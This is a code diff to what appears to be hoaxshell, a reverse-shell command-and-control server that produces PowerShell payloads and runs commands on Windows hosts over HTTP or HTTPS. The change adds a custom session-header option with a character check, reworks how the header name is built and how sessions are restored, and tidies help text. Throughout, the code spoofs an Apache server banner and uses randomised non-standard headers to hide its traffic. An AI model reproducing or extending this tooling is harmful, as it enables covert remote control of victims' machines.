@@ -13,6 +13,7 @@ from threading import Thread, Event
 from time import sleep
 from ipaddress import ip_address
 from subprocess import check_output
+from string import ascii_uppercase, ascii_lowercase
 
 filterwarnings("ignore", category = DeprecationWarning)
 
@@ -50,18 +51,19 @@ Usage examples:
       sudo python3 hoaxshell.py -s <your_ip> -c </path/to/cert.pem> -k <path/to/key.pem>
 
 '''
-	)
+)
 
-parser.add_argument("-s", "--server-ip", action="store", help = "Your hoaxshell server ip address")
+parser.add_argument("-s", "--server-ip", action="store", help = "Your hoaxshell server ip address.")
 parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate.")
-parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate. ")
-parser.add_argument("-p", "--port", action="store", help = "Your hoaxshell server port (default: 8080 over http, 443 over https)", type = int)
-parser.add_argument("-f", "--frequency", action="store", help = "Frequency of cmd execution queue cycle (A low value creates a faster shell but produces more http traffic. *Less than 0.8 will cause trouble. default: 0.8s)", type = float)
-parser.add_argument("-i", "--invoke-restmethod", action="store_true", help = "Generate payload using the 'Invoke-RestMethod' instead of the default 'Invoke-WebRequest' utility")
-parser.add_argument("-r", "--raw-payload", action="store_true", help = "Generate raw payload instead of base64 encoded")
-parser.add_argument("-g", "--grab", action="store_true", help = "Attempts to restore a live session (Default: false)")
-parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo")
-parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup")
+parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate.")
+parser.add_argument("-p", "--port", action="store", help = "Your hoaxshell server port (default: 8080 over http, 443 over https).", type = int)
+parser.add_argument("-f", "--frequency", action="store", help = "Frequency of cmd execution queue cycle (A low value creates a faster shell but produces more http traffic. *Less than 0.8 will cause trouble. default: 0.8s).", type = float)
+parser.add_argument("-i", "--invoke-restmethod", action="store_true", help = "Generate payload using the 'Invoke-RestMethod' instead of the default 'Invoke-WebRequest' utility.")
+parser.add_argument("-H", "--Header", action="store", help = "Hoaxshell utilizes a non-standard header to transfer the session id between requests. A random name is given to that header by default. Use this option to set a custom header name.")
+parser.add_argument("-r", "--raw-payload", action="store_true", help = "Generate raw payload instead of base64 encoded.")
+parser.add_argument("-g", "--grab", action="store_true", help = "Attempts to restore a live session (Default: false).")
+parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo.")
+parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")
 
 args = parser.parse_args()
 
@@ -203,7 +205,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	post_res = str(uuid.uuid4()).replace("-", "")[0:8]
 	output_end = str(uuid.uuid4()).replace("-", "")[0:8]
 	hid = str(uuid.uuid4()).split("-")
-	header_id = f'{hid[0][0:4]}-{hid[1]}'
+	header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not args.Header else args.Header
 	SESSIONID = '-'.join([verify, get_cmd, post_res])
 
 
@@ -213,9 +215,14 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		Hoaxshell.last_received = timestamp
 
 		if args.grab and not Hoaxshell.restored:
-			header_id = [header.replace("X-", "") for header in self.headers.keys() if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
-			Hoaxshell.header_id = header_id[0]
-			session_id = self.headers.get(f'X-{Hoaxshell.header_id}')
+			if not args.Header:
+				header_id = [header.replace("X-", "") for header in self.headers.keys() if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
+				Hoaxshell.header_id = f'X-{header_id[0]}'
+			else:
+				Hoaxshell.header_id = args.Header
+				
+			session_id = self.headers.get(Hoaxshell.header_id)
+			
 			if len(session_id) == 26:
 				h = session_id.split('-')
 				Hoaxshell.verify = h[0]
@@ -229,12 +236,11 @@ class Hoaxshell(BaseHTTPRequestHandler):
 				session_check.start()
 
 				print(f'\r[{GREEN}Shell{END}] {BOLD}Session restored!{END}')
-				#Hoaxshell.command_pool.append(f"echo ' ';echo {Hoaxshell.output_end};split-path $pwd'\\0x00'")
 				Hoaxshell.rst_promt_required = True
 
 		self.server_version = "Apache/2.4.1"
 		self.sys_version = ""
-		session_id = self.headers.get(f'X-{Hoaxshell.header_id}')
+		session_id = self.headers.get(Hoaxshell.header_id)
 		legit = True if session_id == Hoaxshell.SESSIONID else False
 
 		# Verify execution
@@ -287,7 +293,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		Hoaxshell.last_received = timestamp
 		self.server_version = "Apache/2.4.1"
 		self.sys_version = ""
-		session_id = self.headers.get(f'X-{Hoaxshell.header_id}')
+		session_id = self.headers.get(Hoaxshell.header_id)
 		legit = True if session_id == Hoaxshell.SESSIONID else False
 
 		# cmd output
@@ -345,7 +351,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])
 		self.send_header('Vary', "Origin")
 		self.send_header('Access-Control-Allow-Credentials', 'true')
-		self.send_header('Access-Control-Allow-Headers', f'X-{Hoaxshell.header_id}')
+		self.send_header('Access-Control-Allow-Headers', Hoaxshell.header_id)
 		self.end_headers()
 		self.wfile.write(b'OK')
 
@@ -409,7 +415,7 @@ def main():
 			if updated:
 				sys.exit(0)
 
-
+		# Provided options sanity check
 		if not args.server_ip and args.update and len(sys.argv) == 2:
 			sys.exit(0)
 
@@ -427,7 +433,17 @@ def main():
 			except ValueError:
 				exit_with_msg('IP address is not valid.')
 
-
+		
+		# Check provided header name for illegal chars
+		if args.Header:
+			valid = ascii_uppercase + ascii_lowercase + '-_'
+			
+			for char in args.Header:
+				if char not in valid:
+					 exit_with_msg('Header name includes illegal characters.')
+		
+		
+		# Check if http/https
 		if ssl_support:
 			server_port = int(args.port) if args.port else 443
 		else:
